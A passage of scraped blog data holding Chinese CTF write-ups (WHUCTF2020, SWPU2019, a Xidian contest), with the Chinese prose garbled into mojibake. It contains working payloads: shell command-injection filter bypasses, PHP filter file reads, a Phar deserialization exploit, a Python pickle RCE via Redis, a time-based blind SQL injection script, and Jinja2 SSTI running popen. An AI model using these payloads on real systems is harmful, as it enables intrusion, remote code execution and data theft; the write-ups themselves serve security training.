else{\rdie(\u0026quot;no!!!!!!!!\u0026quot;);\r}\r}\relse{\rdie('is str1 numeric??????');\r}\r//3nd\rfunction filter($string){\rreturn preg_replace('/x/', 'yy', $string);\r}\r$username = $_POST['username'];\r$password = \u0026quot;aaaaa\u0026quot;;\r$user = array($username, $password);\r$r = filter(serialize($user));\rif(unserialize($r)[1] == \u0026quot;123456\u0026quot;){\recho file_get_contents('flag.php');\r}\rç¬¬ä¸€å…³ï¼Œnum=23333%0aï¼ŒNCTFå’ŒMRCTFå‡ºç°è¿‡\nç¬¬äºŒå…³ï¼Œè§æœ¬ç«™å¥‡æ€ªçš„MD5ï¼Œç†è§£strtrçš„åŠŸèƒ½ï¼Œexpè·‘1åˆ†é’Ÿå‡ºï¼Œmd5(11230178)=0e732639146814822596b49bb6939b97\nç¬¬ä¸‰å…³ï¼Œååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œå‚è€ƒminiLCTFã€å®‰æ’4æœˆèµ›\nezcmd è€ƒç‚¹ï¼š$IFSç»•ç©ºæ ¼ï¼Œ\\åˆ†å‰²å…³é”®å­—ï¼Œå˜é‡ç»•è¿‡flagåŒ¹é…\n\u0026lt;?php\rif(isset($_GET['ip'])){\r$ip = $_GET['ip'];\rif(preg_match(\u0026quot;/\\\u0026amp;|\\/|\\?|\\*|\\\u0026lt;|[\\x{00}-\\x{1f}]|\\\u0026gt;|\\'|\\\u0026quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026quot;, $ip, $match)){\recho preg_match(\u0026quot;/\\\u0026amp;|\\/|\\?|\\*|\\\u0026lt;|[\\x{00}-\\x{20}]|\\\u0026gt;|\\'|\\\u0026quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026quot;, $ip, $match);\rdie(\u0026quot;fxck your symbol!\u0026quot;);\r} else if(preg_match(\u0026quot;/ /\u0026quot;, $ip)){\rdie(\u0026quot;no space!\u0026quot;);\r} else if(preg_match(\u0026quot;/.*f.*l.*a.*g.*/\u0026quot;, $ip)){\rdie(\u0026quot;no flag\u0026quot;);\r} else if(preg_match(\u0026quot;/tac|rm|echo|cat|nl|less|more|tail|head/\u0026quot;, $ip)){\rdie(\u0026quot;cat't read flag\u0026quot;);\r}\r$a = shell_exec(\u0026quot;ping -c 4 \u0026quot;.$ip); echo \u0026quot;\u0026lt;pre\u0026gt;\u0026quot;;\rprint_r($a);\r}\rhighlight_file(__FILE__);\r?\u0026gt;\rå‚è€ƒï¼šhttps://cloud.tencent.com/developer/article/1599149\nplayload:\n?ip=0.0.0.0;a=g;b=fla;ca\\t$IFS$b$a.php\rwhuctf{11041f3d-3fbb-4dfd-8f27-31788300b54c}\nezinclude è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«å‚æ•°çˆ†ç ´\næ‰“å¼€é¢˜ç›®ï¼Œæ‰«ç›®å½•åˆ°äº†info.phpï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯ä¸´æ—¶æ–‡ä»¶åŒ…å«ï¼Œç»“æœã€‚ã€‚\nåœ¨contact.phpæäº¤è¡¨å•ï¼Œè·³è½¬åˆ°/thankyou.phpï¼Œé‡Œé¢çœ‹åˆ°äº†å‡ ä¸ªå‚æ•°ï¼Œç›´æ¥çˆ†ç ´å‡ºfileå‚æ•°ï¼Œ\nfile=php://filter/read=convert.base64-encode/resource=flag.php\rå¾—åˆ°base64ç¼–ç çš„flag\nwhuctf{N0w_y0u_kn0w_file_inclusion}\nEasy_unserialize è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«ã€Pharååºåˆ—åŒ–\npharå­¦ä¹ é“¾æ¥\n\u0026gt;\u0026gt;https://www.freebuf.com/column/198945.html\n\u0026gt;\u0026gt;https://paper.seebug.org/680/\né¢˜ç›®åç§°æ˜¯unserializeï¼Œä¸è¿‡æ‰“å¼€å´æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œä¸Šä¼ å’Œååºåˆ—åŒ–ç»“åˆçš„æˆ‘åªèƒ½æƒ³åˆ°pharååºåˆ—åŒ–ï¼Œä½†æ˜¯ç”±äºä»¥å‰åšé¢˜ç›´æ¥è·³è¿‡äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œä¸å¤Ÿç†Ÿæ‚‰ï¼Œæ¯”èµ›çš„æ—¶å€™å‡ºäº†ä¸€ç‚¹å°æ•…éšœæ²¡åšå‡ºæ¥ã€‚\nåœ¨ä¸»é¡µçš„æºç é‡Œé¢å¯ä»¥çœ‹åˆ°æç¤º \u0026lt;!-- flag.php --\u0026gt; ï¼Œåˆ†åˆ«è®¿é—® upload.php å’Œ view.php ç„¶åå›å¤´çœ‹æŠ“åŒ…ï¼Œå‘ç°äº†æœ‰ä¸€ä¸ª acti0n=upload å’Œ acti0n=view çš„302é‡å®šå‘ï¼Œæ”¾åˆ°bpï¼Œç”¨ä¼ªåè®®å¯ä»¥è¯»å–ä¸¤ä¸ªé¡µé¢çš„æºç ï¼š\n?acti0n=pHp://Filter/read=convert.Base64-encode/resource=upload.php\r?acti0n=pHp://Filter/read=convert.Base64-encode/resource=view.php\ræ³¨æ„ä»–è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ï¼Œéœ€è¦å¤§å°å†™ç»•è¿‡ã€‚\nå¾—åˆ°äº†æºç ä¹‹åå°±æ˜¯å®¡è®¡äº†ï¼Œåœ¨ upload.php é‡Œé¢ä¹Ÿèƒ½çœ‹åˆ°è¿™æ ·ä¸€æ®µï¼š\nif(preg_match('/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i', $extension) === 0) {\rdie(\u0026quot;\u0026lt;p align=\\\u0026quot;center\\\u0026quot;\u0026gt;You can't upload this kind of file!\u0026lt;/p\u0026gt;\u0026quot;);\r}\rä¹Ÿé—´æ¥ï¼ˆç›´æ¥ï¼‰æš—ç¤ºï¼ˆæ˜ç¤ºï¼‰äº†æˆ‘ä»¬pharçš„æ“ä½œã€‚\nåœ¨view.phpé‡Œé¢çœ‹åˆ°ï¼š\nif (isset($_POST['show'])) {\r$file_name = $_POST['show'];\r$ins-\u0026gt;show_img($file_name);\r}\rif (isset($_POST['delete'])) {\r$file_name = $_POST['delete'];\r$ins-\u0026gt;delete_img($file_name);\r}\rè½¬åˆ°å£°æ˜ï¼š\n class View\r{\rpublic $dir;\rprivate $cmd;\râ€¦â€¦â€¦â€¦\râ€¦â€¦â€¦â€¦\rfunction show_img($file_name) {\r$name = $file_name;\r$width = getimagesize($name)[0];\r$height = getimagesize($name)[1];\r$times = $width / 200;\r$width /= $times;\r$height /= $times;\r$template = \u0026quot;\r\u0026lt;img style=\\\u0026quot;clear: both;display: block;margin: auto;\\\u0026quot; src=\\\u0026quot;$this-\u0026gt;dir$name\\\u0026quot; alt=\\\u0026quot;$file_name\\\u0026quot; width = \\\u0026quot;$width\\\u0026quot; height = \\\u0026quot;$height\\\u0026quot;\u0026gt;\r\u0026quot;;\recho $template;\r}\rfunction delete_img($file_name) {\r$name = $file_name;\rif (file_exists($name)) {\r@unlink($name);\rif(!file_exists($name)) {\recho \u0026quot;\u0026lt;p align=\\\u0026quot;center\\\u0026quot; style=\\\u0026quot;font-weight: bold;\\\u0026quot;\u0026gt;æˆåŠŸåˆ é™¤! 3såè·³è½¬\u0026lt;/p\u0026gt;\u0026quot;;\rheader(\u0026quot;refresh:3;url=view.php\u0026quot;);\r} else {\recho \u0026quot;Can not delete!\u0026quot;;\rexit;\r}\r} else {\recho \u0026quot;\u0026lt;p align=\\\u0026quot;center\\\u0026quot; style=\\\u0026quot;font-weight: bold;\\\u0026quot;\u0026gt;æ‰¾ä¸åˆ°è¿™ä¸ªæ–‡ä»¶! \u0026lt;/p\u0026gt;\u0026quot;;\r}\r}\rfunction __destruct() {\reval($this-\u0026gt;cmd);\r}\r}\rfunction delete_img é‡Œé¢æœ‰ file_exists() å¯ä»¥è§¦å‘pharååºåˆ—åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¼€å§‹æ„é€ pharæ–‡ä»¶ï¼š\n\u0026lt;?php\rclass View\r{\rpublic $dir;\rprivate $cmd = 'show_source(\u0026quot;/var/www/html/flag.php\u0026quot;);';\r}\r@unlink(\u0026quot;phar.phar\u0026quot;);\r$phar = new Phar(\u0026quot;phar.phar\u0026quot;); //åç¼€åå¿…é¡»ä¸ºphar\r$phar-\u0026gt;startBuffering();\r$phar-\u0026gt;setStub(\u0026quot;GIF89a\u0026quot;.\u0026quot;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026quot;); //è®¾ç½®stub\r$o = new view();\r$phar-\u0026gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest\r$phar-\u0026gt;addFromString(\u0026quot;test.jpg\u0026quot;, \u0026quot;test\u0026quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶\r//ç­¾åè‡ªåŠ¨è®¡ç®—\r$phar-\u0026gt;stopBuffering();\r?\u0026gt;\rç”±äºuploadé‡Œé¢banäº†ä¸€äº›å‡½æ•°ï¼Œé¢˜ç›®åˆæç¤ºäº†flag.phpï¼Œæˆ‘ä»¬å°±ç›´æ¥show_source\nè¿è¡Œï¼Œç”Ÿæˆpharæ–‡ä»¶ï¼Œä¸Šä¼ ã€‚\nåœ¨ view.php POSTè¯·æ±‚ï¼š\ndelete=phar://phar.phar\rç›´æ¥å¾—åˆ°flag.phpçš„æºç \nWHUCTF{Phar_1s_Very_d@nger0u5}\n","date":"2020-05-24T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170745.jpeg","permalink":"https://anthem-whisper.github.io/p/whuctf2020/","title":"WHUCTF2020"},{"content":"Web2 è€ƒç‚¹ï¼šrediså¼±å£ä»¤ï¼Œpythonååºåˆ—åŒ–\nBUUä¸Šé¢çš„ç¯å¢ƒéœ€è¦ Shadowsocks ä»£ç†æ‰èƒ½è®¿é—®ï¼Œé…ç½®è¿™ä¸ªéƒ½æäº†åŠå¤©ï¼ˆtcl\nä¸‹è½½é…ç½®shadowsocks sudo apt-get install shadowsocks\rè¿æ¥ä»£ç† sslocal -s node3.buuoj.cn -p 11111 -k 123456\ræŠ¥é”™ï¼šAttributeError: /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup\næŠ¥é”™å‚è€ƒï¼šhttps://www.jianshu.com/p/3f874d5aac54\nåœ¨Python2.7ä¸­çš„opensslæ–‡ä»¶ä¸­,ä¸‹é¢è¿™ä¸ªå‡½æ•°æ²¡æœ‰å®šä¹‰,å…·ä½“å°±æ˜¯è¿™ä¸ª:\nEVP_CIPHER_CTX_cleanup\ræ›´æ·±å±‚çš„æ˜¯æ˜¯ç”±äºåœ¨openssl1.1.0ç‰ˆæœ¬ä¸­ï¼ŒåºŸå¼ƒäº† EVP_CIPHER_CTX_cleanup å‡½æ•°,è¦ç”¨è¿™ä¸ªå‡½æ•° EVP_CIPHER_CTX_reset() ä»£æ›¿;\nç›´æ¥ vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py æ‰“å¼€æ–‡ä»¶ï¼Œå…¨å±€æœç´¢å…³é”®å­—æ›¿æ¢å³å¯ï¼›\nkaliä¸‹ç¼–è¯‘å®‰è£…proxychains4 ç¼–è¯‘å®‰è£… git clone https://github.com/rofl0r/proxychains-ng.git # download\rcd proxychains-ng\r./configure\rsudo make sudo make install\rcp ./src/proxychains.conf /etc/proxychains.conf # config file\rç”¨proxychainsåšæ­£å‘ä»£ç† vim /etc/proxychains.conf\ræ·»åŠ ä¸€è¡Œï¼šsocks5 127.0.0.1 1080ï¼ˆå…·ä½“å–å†³äºä½ çš„ssé…ç½®çš„ç«¯å£ï¼‰\nä¸è¿‡æˆ‘è¿™é‡Œéœ€è¦æ³¨é‡Šæ‰åŸæ¥çš„é‚£ä¸€è¡Œ socks4 127.0.0.1 9050\nå‘½ä»¤è¡Œè®¿é—®å†…ç½‘ proxychains4 ping web åªéœ€åœ¨å‰é¢åŠ  proxychains4 å°±è¡Œäº†\næµè§ˆå™¨è®¿é—®å†…ç½‘ æµè§ˆå™¨é…ç½®æµè§ˆå™¨ä»£ç†ï¼Œé€‰æ‹©Sock5ï¼Œipè®¾ä¸º127.0.0.1ï¼Œç«¯å£è®¾ä¸ºé»˜è®¤çš„1080ã€‚\nç„¶åæˆ‘ä»¬ç”¨æµè§ˆå™¨è®¿é—®http://web:2333/ï¼Œæ³¨å†Œç™»å½•ä¹‹ååœ¨æºç é‡Œé¢å‘ç° redis å­—æ ·æç¤ºï¼Œå¾—çŸ¥æ˜¯redisï¼Œç”¨å‘½ä»¤è¡Œè®¿é—®\nproxychains4 redis-cli -h web -p 6379\nå‘ç°æ‰§è¡Œå‘½ä»¤éœ€è¦å¯†ç ï¼Œæˆ‘ä»¬ç”¨msfçš„æ¨¡å—çˆ†ç ´ä¹‹ï¼š\nsudo proxychains4 msfconsole\rsearch redis\ruse auxiliary/scanner/redis/redis_login\rset rhosts web\rset rport 6379\rexploit\rå¾—åˆ°å¯†ç ï¼špassword\näºæ˜¯å¯ä»¥æŸ¥çœ‹æ•°æ®ï¼š\næˆ‘çœ‹åˆ°äº†è‡ªå·±çš„sessionï¼Œå‘ç°æ˜¯pythonåºåˆ—åŒ–ä¹‹åçš„æ•°æ®ï¼Œæˆ‘ä»¬è®¿é—®çš„æ—¶å€™ä»–ä¼šå¯¹è¿™ä¸ªæ•°æ®è¿›è¡Œååºåˆ—åŒ– å¦‚æœæˆ‘ä»¬æ§åˆ¶äº†è¿™ä¸ªæ•°æ®ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¥è¿›è¡Œgetshell å¯¹pythonä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œç½‘ä¸Šæ‰¾åˆ°expæ”¹ä¸€æ”¹ï¼š\n#!/usr/bin/env python\rimport cPickle\rimport os\rimport redis\rclass exp(object):\rdef __reduce__(self):\rs = \u0026quot;ls / \u0026gt; ./static/js/materialize.min.js\u0026quot;\r#æ‰§è¡Œå‘½ä»¤ï¼Œå¤–å¸¦åˆ°ä¸€ä¸ªjsæ–‡ä»¶ï¼Œå¼¹shellæ˜¯ä¸å¯ä»¥çš„ï¼ŒBUUå†…ç½‘éƒ½ä¸å¯ä»¥ï¼ŒæŠ˜è…¾äº†å¥½ä¹…\rreturn (os.system, (s,))\re = exp()\rs = cPickle.dumps(e)\rr = redis.Redis(host='web',password=\u0026quot;password\u0026quot;, port=6379, db=0)\rr.set(\u0026quot;session:1ea713bb-ad84-489b-b48b-1ba3f07b7ecb\u0026quot;, s)#è¿™é‡Œéœ€è¦æ”¹ä¸ºè‡ªå·±çš„session\rè¿è¡Œ proxychains4 python exp.py å‘½ä»¤ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨redisçš„ç»ˆç«¯çœ‹åˆ°æˆ‘ä»¬çš„session å·²ç»è¢«æ”¹ä¸ºæˆ‘ä»¬æ¶æ„çš„åºåˆ—åŒ–ç»“æœäº†ï¼Œå†æ¬¡è®¿é—®http://web:2333/è¾“å…¥ç”¨æˆ·åå¯†ç ç™»é™†å å°±å¯ä»¥åœ¨/static/js/materialize.min.jsæ–‡ä»¶ä¸­çœ‹åˆ°æˆ‘ä»¬å‘½ä»¤æ‰§è¡Œç»“æœï¼š\nflag{b13534e2-8984-4f59-a46f-1f8eac316899}\nweb3 è€ƒç‚¹ï¼šflask sessionä¼ªé€ ï¼Œè½¯è¿æ¥è¯»å–flagï¼Œå‘½ä»¤æ³¨å…¥\nè¯·è§BUUåˆ·é¢˜è®°å½•3\nweb4 è€ƒç‚¹ï¼šPDOåœºæ™¯ä¸‹çš„å †å æ³¨å…¥ã€æ—¶é—´ç›²æ³¨\næ‰“å¼€é¢˜ç›®å«ä½ ç™»å½•ï¼Œä¸è¿‡ä»»å‡­ä½ æ€ä¹ˆç™»å½•éƒ½ä¼šæ²¡æœ‰ååº”ï¼Œæ³¨å†Œè¯´â€œæœªå¼€æ”¾æ³¨å†ŒåŠŸèƒ½â€\nå›å¤´ä¸€æŠ“åŒ…ï¼Œå‘ç°æˆ‘ä»¬å‘ /index.php?r=Login/Login å‘é€äº†ä¸€ä¸ªæ•°æ®åŒ…ï¼Œè¿™é‡Œå¯ä»¥æ³¨å…¥ï¼ŒPOSTè¾“å…¥ï¼š\n{\u0026quot;username\u0026quot;:\u0026quot;1'\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;123\u0026quot;}\ré¡µé¢ä¼šæŠ¥é”™ï¼Œä½†æ˜¯æˆ‘ä»¬è¾“å…¥ï¼š\n{\u0026quot;username\u0026quot;:\u0026quot;1';\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;123\u0026quot;}\ré¡µé¢å´æ²¡æŠ¥é”™ï¼ŒåŒæ—¶è¯´å¯†ç é”™è¯¯ï¼›\né‚£ä¹ˆè¯´æ˜è¿™é“é¢˜å¯ä»¥å †å æ³¨å…¥ã€‚\nå°è¯• 1';show databases; ä¹‹ç±»çš„æ“ä½œï¼Œä¸€ç›´æ˜¾ç¤ºå¯†ç é”™è¯¯ï¼ŒçŒœæµ‹å¯èƒ½å…³é”®å­—è¢«wafäº†ï¼Œå› ä¸ºæ˜¯å †å ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒæ–°æ˜¥æˆ˜ç–«çš„ä¸€é“å †å æ³¨å…¥ï¼ˆå½“æ—¶ä¹Ÿæ˜¯PDOï¼‰ï¼Œä½¿ç”¨é¢„ç¼–è¯‘+16è¿›åˆ¶ç¼–ç ç»•è¿‡wafã€‚\nè€Œä¸”é¡µé¢ä¸ä¼šæ ¹æ®æˆ‘ä»¬è¾“å…¥æƒ…å†µå›æ˜¾ä¸åŒï¼Œé‚£ä¹ˆå°±ç”¨æ—¶é—´ç›²æ³¨ï¼›\nexpï¼š\n# by wh1sper\r# æ—¶é—´ç›²æ³¨\rimport requests\rimport time\rhost = 'http://fe683617-4ef1-4c6a-8332-febe7058c07e.node3.buuoj.cn/index.php?r=Login/Login'\rdef mid(bot, top):\rreturn (int)(0.5 * (top + bot))\rdef char_to_hex(str):\rres = ''\rfor i in str:\rres += hex(ord(i))\rres = '0x' + res.replace('0x', '')\rreturn res\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\r#babyselect = 'database()'#---\u0026gt;ctf\r#babyselect = '(select group_concat(table_name) ' \\\r# 'from information_schema.tables where table_schema=database())'#---flag\r# babyselect = '(select group_concat(column_name) ' \\\r# 'from information_schema.columns where table_name='flag')'#---\u0026gt;flag\rbabyselect = '(select flag from flag)'#---\u0026gt;glzjin_wants_a_girl_friend.zip\rselect = \u0026quot;select if((ascii(substr(\u0026quot; +babyselect+ \u0026quot;,{},1))\u0026gt; {}),sleep(3),1);\u0026quot;\\\r.format(j, mid(bot, top))\rplayload = \u0026quot;1';set @a=\u0026quot;+ char_to_hex(select) +\u0026quot;;PREPARE test from @a;execute test;\u0026quot;\rdata = {\r\u0026quot;username\u0026quot;: playload,\r\u0026quot;password\u0026quot;: \u0026quot;1\u0026quot;\r}\rprint(mid(bot, top))\rstart_time = time.time()\rr = requests.post(url=host, json=data)\rend_tmie = time.time()\r#print(r.text)\rif end_tmie - start_time \u0026gt; 1.5: # æˆåŠŸ\rif top - 1 == bot: # topå’Œbotç›¸é‚»ï¼Œè¯´æ˜nameæ˜¯top\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top) # æˆåŠŸå°±ä¸Šç§»bot\relse: # å¤±è´¥\rif top - 1 == bot: # topå’Œbotç›¸é‚»ï¼ŒåŠ ä¸Šå¤±è´¥ï¼Œè¯´æ˜nameæ˜¯bot\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top) # å¤±è´¥å°±ä¸‹ç§»top\rif __name__ == '__main__':\rsqli()\rå¾—åˆ°ï¼šglzjin_wants_a_girl_friend.zip\nç„¶åçœ‹çš„å‡ºæ¥æ˜¯ä¸ªæ–‡ä»¶ï¼Œè®¿é—®ä¸‹è½½ä¹‹ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚ å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬è¦é€šè¿‡æŸç§æ–¹æ³•å°†flag.phpä¸­çš„æ–‡ä»¶å†…å®¹ç»™è¯»å–å‡ºæ¥ã€‚\nè¿™æ˜¯ä¸ªMVCæ¨¡å‹ï¼Œé¦–å…ˆäº†è§£ä¸€ä¸‹è¯¥æ¡†æ¶ä¸‹urlçš„è§£æè¿‡ç¨‹ï¼š\n ä»rå‚æ•°ä¸­è·å–è¦è®¿é—®çš„ Controller ä»¥åŠ Action ,ç„¶åä»¥ / åˆ†éš”å¼€åæ‹¼æ¥æˆå®Œæ•´çš„æ§åˆ¶å™¨åã€‚ ä»¥ Login/Index ä¸ºä¾‹ï¼Œå°±æ˜¯å°† Login/Index åˆ†éš”å¼€åˆ†åˆ«æ‹¼æ¥æˆ LoginController ä»¥åŠ actionIndex ,ç„¶åè°ƒç”¨ LoginController è¿™ä¸ªç±»ä¸­çš„ actionIndex æ–¹æ³•ã€‚æ¯ä¸ª action é‡Œé¢ä¼šè°ƒç”¨å¯¹åº”çš„ loadView() æ–¹æ³•è¿›è¡Œæ¨¡ç‰ˆæ¸²æŸ“ï¼Œç„¶åå°†é¡µé¢è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ è‹¥è®¿é—®çš„ Controller ä¸å­˜åœ¨åˆ™é»˜è®¤è§£æ Login/Index ã€‚  è¿™æ ·æˆ‘ä»¬å°±åº”è¯¥å…ˆæ¥å®¡è®¡æ§åˆ¶å™¨çš„ä»£ç ã€‚\nä¸éš¾å‘ç°ï¼Œåœ¨BaseControllerä¸­æœ‰ç€è¿™ä¹ˆä¸€æ®µæ˜æ˜¾æœ‰é—®é¢˜çš„ä»£ç \npublic function loadView($viewName ='', $viewData = [])\r{\r$this-\u0026gt;viewPath = BASE_PATH . \u0026quot;/View/{$viewName}.php\u0026quot;;\rif(file_exists($this-\u0026gt;viewPath))\r{\rextract($viewData);\rinclude $this-\u0026gt;viewPath;\r}\r}\rè¿™æ®µä»£ç ä¸­ä½¿ç”¨äº† extract() ï¼Œä»¥åŠåŒ…å«äº† /View/{$viewName}.php ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½é€šè¿‡ $viewName å’Œ $viewData è¿™ä¸¤ä¸ªå˜é‡æ¥æ›´æ”¹ /View ä¸‹ä»»ä½•ä¸€ä¸ªphpæ–‡ä»¶çš„ä»»ä½•ä¸€ä¸ªå˜é‡çš„å€¼ã€‚\nåœ¨UserControllerä¸­æ‰¾åˆ°äº†ä»¥ä¸‹ä»£ç :\npublic function actionIndex()\r{\r$listData = $_REQUEST;\r$this-\u0026gt;loadView('userIndex',$listData);\r}\rå¯ä»¥çœ‹å‡ºæ¥ï¼Œå…¶ä¸­ $listData æ˜¯ä»è¯·æ±‚ä¸­è·å–ï¼Œç”¨æˆ·å¯æ§ï¼Œè€Œå…¶å¯¹åº”çš„ /View/userIndex.php ä¸­å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶è¯»å–ï¼š\n\u0026lt;div class=\u0026quot;fakeimg\u0026quot;\u0026gt;\u0026lt;?php\rif(!isset($img_file)) {\r$img_file = '/../favicon.ico';\r}\r$img_dir = dirname(__FILE__) . $img_file;\r$img_base64 = imgToBase64($img_dir);\recho '\u0026lt;img src=\u0026quot;' . $img_base64 . '\u0026quot;\u0026gt;'; //å›¾ç‰‡å½¢å¼å±•ç¤º\r?\u0026gt;\u0026lt;/div\u0026gt;\rå…¶ä¸­ imgToBase64() å®ç°çš„æ˜¯å°†ç›®æ ‡æ–‡ä»¶è½¬åŒ–æˆbase64æ ¼å¼ã€‚è€Œæˆ‘ä»¬åªéœ€è¦å°† $img_file æ”¹æˆ /flag.php å³å¯ã€‚\nè®¿é—® http://ip/index.php?r=User/Index\u0026amp;img_file=/../flag.php å³å¯è·å¾—flagçš„base64\nflag{fd2a64c6-8bd5-48c8-8ed7-8b5974dfaddf}\n","date":"2020-05-18T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/swpu2019-%E5%A4%8D%E7%8E%B0/","title":"SWPU2019 å¤ç°"},{"content":"è¥¿ç”µæ ¡èµ›ï¼Œéš¾åº¦é€‚ä¸­ï¼Œæœ¬äººå†…é¬¼é€‰æ‰‹ï¼Œçœ‹äº†ä¸‹é¢˜ã€‚\n id_wife è€ƒç‚¹ï¼šå †å æ³¨å…¥\nä¸æ˜¯å¾ˆéš¾ï¼Œæœ€å¼€å§‹æ²¡æƒ³åˆ°å †å ï¼Œè·‘å»ç›²æ³¨ï¼Œå·®ç‚¹æ€€ç–‘äººç”Ÿ\næµ‹å‡ºæ¥å †å ä¹‹åå°±ç®€å•äº†ï¼Œå…¶ä»–è¿‡æ»¤ä»€ä¹ˆæˆ‘ä¸çŸ¥é“ï¼Œç›´æ¥å‚è€ƒæ–°æ˜¥æˆ˜ç–«çš„ä¸€é“sqliï¼ŒHandlerä¸€æŠŠæ¢­\nfrank');handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#\rminil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}\nPersonal_IP_Query è€ƒå¯Ÿï¼šflaskSSTIï¼Œç»•è¿‡ä¸‹åˆ’çº¿ã€å•åŒå¼•å·ã€‚\nå­¦ä¹ é“¾æ¥\n\u0026gt;\u0026gt;flag0å¸ˆå‚…\n\u0026gt;\u0026gt;byc_404å¸ˆå‚…\næ‰“å¼€é¢˜ç›®ï¼Œæ˜¾ç¤ºYour Ip ISâ€¦â€¦é©¬ä¸Šæƒ³åˆ°XFFå¤´ï¼Œä¼ªé€ ä¹‹åå‘ç°è¾“å…¥çš„XFFå¤´æ˜¾ç¤ºå‡ºæ¥äº†ï¼Œç„¶åè¸Œèº‡äº†ä¸€é˜µå­ï¼Œå›å¤´çœ‹å“åº”åŒ…ï¼Œå“åº”å¤´é‡Œé¢æœ‰ä¸€ä¸ªSERVERæç¤ºè¿™ä¸ªæ˜¯pythonçš„åç«¯ï¼Œé‚£ä¹ˆå°±å°è¯•SSTI\nè¾“å…¥ {{2+2}} ä¹‹åå›æ˜¾çš„ 4 å®é”¤ã€‚\nFuzzï¼Œè¿‡æ»¤äº†ä¸‹åˆ’çº¿ã€å•åŒå¼•å·ã€æ²¡æœ‰è¿‡æ»¤ä¸­æ‹¬å·\næœ€å¼€å§‹æˆ‘ç”¨çš„æ˜¯[request.value.class]é‚£ä¸ªï¼Œåæ¥è¯•äº†åŠå¤©ä¸èƒ½ç»•è¿‡ä¸­æ‹¬å·é‡Œè¿˜æœ‰å¼•å·çš„ï¼Œåæ¥é˜Ÿå‹æ”¹ç”¨attr(request.args.class)ç§’å‡º\nåœ¨classä¸­å¯»æ‰¾æ¨¡å—expï¼š\n#python 3\rimport re\rstr = '''\rï¼ˆå›æ˜¾ä¿¡æ¯ï¼‰\r'''\rlist = re.split(',', str)\rfor i in range(0, len(list)):\rif 'catch_warnings' in list[i]:\rprint(i)\rbreak\rplayloadï¼š\n?x1=__class__\u0026amp;x2=__base__\u0026amp;x3=__subclasses__\u0026amp;x4=__getitem__\u0026amp;x5=__init__\r\u0026amp;x6=__globals__\u0026amp;x7=__builtins__\u0026amp;x8=eval\u0026amp;x9=__import__(\u0026quot;os\u0026quot;).popen('cat+/flag').read()\rX-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()\r|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)\r|attr(request.args.x4)(request.args.x8)(request.args.x9)}}\rå¤ç°æ—¶è¡¥å……ï¼š\næˆ‘çš„åŸæ¥é‚£ä¸ªä¸­æ‹¬å·çš„åšæ³•æ—¶èµ°å¾—é€šçš„ï¼Œç„¶åosæ¨¡å—ä¹Ÿå¯ä»¥çš„ï¼Œåªæ˜¯å½“æ—¶å¯èƒ½ç”±äºæŸäº›ç„å­¦åŸå› æ²¡æˆåŠŸï¼Œè¿™é‡Œè¡¥ä¸Šï¼š\nXFFï¼š{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}\r//å›æ˜¾ï¼šYour IP: \u0026lt;class 'os._wrap_close'\u0026gt;\rGET ï¼š?class=__class__\u0026amp;mro=__mro__\u0026amp;subclasses=__subclasses__\u0026amp;init=__init__\u0026amp;globals=__globals\r__\u0026amp;builtins=__builtins__\u0026amp;eval=eval\u0026amp;cmd=__import__(\u0026quot;os\u0026quot;).popen(\u0026quot;cat+/flag\u0026quot;).read()\rx-forwarded-for: {{ [][request.args.class][request.args.mro][1][request.args.subclasses]()\r[127][request.args.init][request.args.globals][request.args.builtins][request.args.eval]\r(request.args.cmd) }}\rezbypass è€ƒå¯Ÿï¼šè¿‡æ»¤é€—å·ç­‰å·çš„æ— åˆ—åæ³¨å…¥ï¼ŒPHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸\nè¿™é“é¢˜ä¸¤ä¸ªæ­¥éª¤ï¼Œç¬¬ä¸€å±‚æ˜¯sqliï¼Œç¬¬äºŒå±‚æ˜¯ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\nç¬¬ä¸€å±‚æˆ‘åšçš„éé¢„æœŸï¼Œfuzzè¿‡åï¼Œå‘ç°banäº†é€—å·ã€ç­‰å·ã€or\nç„¶åå‘ç°æ˜¯åŒå¼•å·é—­åˆ\nlogname=1\u0026quot;||1 limit 